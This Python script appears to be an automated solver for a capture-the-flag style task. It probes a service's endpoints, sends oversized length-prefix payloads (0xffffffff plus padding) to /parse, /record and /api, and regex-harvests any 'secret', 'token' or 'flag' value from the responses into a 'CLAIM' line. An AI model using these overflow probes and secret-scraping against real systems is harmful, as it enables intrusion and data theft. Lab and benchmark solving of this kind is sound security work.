import sys, json, base64, re, binascii

def send(method, path, body=None, body_hex=None, headers=None):
    http = {"method": method, "path": path}
    if body is not None:
        http["body"] = body
    if body_hex is not None:
        http["body_hex"] = body_hex
    if headers:
        http["headers"] = headers
    try:
        sys.stdout.write(json.dumps({"http": http}) + "\n")
        sys.stdout.flush()
    except Exception:
        return None
    line = sys.stdin.readline()
    if not line:
        return None
    line = line.strip()
    if not line:
        return None
    try:
        return json.loads(line)
    except Exception:
        return None

TEXT = []

def probe(method, path, **kw):
    r = send(method, path, **kw)
    st = None
    body = b''
    if isinstance(r, dict):
        st = r.get('status')
        b = r.get('body_b64')
        if isinstance(b, str):
            try:
                body = base64.b64decode(b)
            except Exception:
                body = b.encode('latin-1', 'replace')
    TEXT.append(body.decode('latin-1'))
    return st, body

for p in ['/', '/index.html', '/health', '/help', '/docs', '/openapi.json', '/parse', '/record', '/api']:
    probe('GET', p)

probe('POST', '/parse', body=json.dumps({'len': 4294967295, 'data': 'AAAA'}), headers={'Content-Type': 'application/json'})
probe('POST', '/parse', body_hex='ffffffff' + '41' * 32, headers={'Content-Type': 'application/octet-stream'})
probe('POST', '/record', body_hex='ffffffff' + '41' * 32, headers={'Content-Type': 'application/octet-stream'})
probe('POST', '/api', body_hex='ffffffff' + '41' * 32, headers={'Content-Type': 'application/octet-stream'})

alltext = '\n'.join(TEXT)
cands = []
for t in TEXT:
    for m in re.finditer(r'(?i)secret[\s\"\':=_\-]{0,24}([0-9a-fA-F]{16,})', t):
        cands.append(m.group(1))
    for m in re.finditer(r'(?i)[\"\'](?:secret|token|flag)[' + '\"\']\\s*:\\s*[\"\']([^\"\']+)', t):
        cands.append(m.group(1))

if cands:
    v = cands[0].strip()
    if re.fullmatch(r'[0-9a-fA-F]+', v) and len(v) % 2 == 0:
        secret_hex = v.lower()
    else:
        secret_hex = binascii.hexlify(v.encode('utf-8')).decode()
else:
    secret_hex = ''

sys.stdout.write('CLAIM:' + json.dumps({'secret_hex': secret_hex}) + '\n')
sys.stdout.flush()